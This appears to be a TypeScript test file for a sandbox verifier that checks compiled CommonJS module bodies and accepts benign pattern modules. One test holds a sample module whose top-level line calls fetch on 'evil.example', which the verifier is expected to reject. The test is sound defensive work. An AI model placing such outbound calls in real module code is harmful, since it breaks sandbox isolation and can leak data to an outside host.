import { describe, it } from "@std/testing/bdd";
import { expect } from "@std/expect";

import { compileSourcesToRecords } from "../src/sandbox/module-record-compiler.ts";
import { verifyCompiledModuleBody } from "../src/sandbox/module-record-verifier.ts";

// D2: the ESM verifier front-end classifies each module's compiled-CommonJS
// body. Unlike the AMD factory (deps are params), the CJS body has a
// `const x = require("...")` import preamble that the front-end must recognize
// (seeding env with import bindings) before handing the rest to the shared
// classifyModuleItems core.

function compiledBody(files: Record<string, string>, path: string): string {
  const sources = Object.entries(files).map(([name, contents]) => ({
    name,
    contents,
  }));
  const { specifierByPath, compiledBodies } = compileSourcesToRecords(sources, {
    runtimeModules: { commonfabric: ["pattern", "lift", "handler", "derive"] },
  });
  return compiledBodies.get(specifierByPath.get(path)!)!;
}

describe("verifyCompiledModuleBody", () => {
  it("accepts a benign multi-import pattern module", () => {
    const body = compiledBody({
      "/util.ts": `export const dbl = (x: number): number => x * 2;`,
      "/main.tsx":
        `import { dbl } from "./util.ts";\nimport { pattern, lift } from "commonfabric";\nexport const helper = (x: number) => dbl(x);\nexport const v = pattern((s: { n: number }) => ({ d: lift((c: number) => dbl(c))(s.n) }));\nexport default v;\n`,
    }, "/main.tsx");
    expect(() => verifyCompiledModuleBody(body, "/main.tsx")).not.toThrow();
  });

  it("accepts a module with a default import (inline __importDefault helper)", () => {
    // Default imports make the compiler emit an inline `var __importDefault =
    // …` helper; the verifier must allow that canonical declaration.
    const body = compiledBody({
      "/dep.ts": `const v = 7;\nexport default v;`,
      "/main.ts":
        `import dep from "./dep.ts";\nexport const run = (): number => dep + 1;`,
    }, "/main.ts");
    expect(body).toContain("__importDefault"); // sanity: the helper is present
    expect(() => verifyCompiledModuleBody(body, "/main.ts")).not.toThrow();
  });

  it("accepts the imported leaf module", () => {
    const body = compiledBody({
      "/util.ts": `export const dbl = (x: number): number => x * 2;`,
    }, "/util.ts");
    expect(() => verifyCompiledModuleBody(body, "/util.ts")).not.toThrow();
  });

  it("rejects unwrapped mutable top-level data", () => {
    const body = compiledBody({
      "/main.ts": `export const config = { a: 1, b: 2 };`,
    }, "/main.ts");
    expect(() => verifyCompiledModuleBody(body, "/main.ts")).toThrow(
      /__cf_data/,
    );
  });

  it("rejects a top-level call result that is not a trusted builder/data", () => {
    const body = compiledBody({
      "/main.ts":
        `const leaked = fetch("https://evil.example");\nexport const x = 1;\n`,
    }, "/main.ts");
    expect(() => verifyCompiledModuleBody(body, "/main.ts")).toThrow();
  });
});
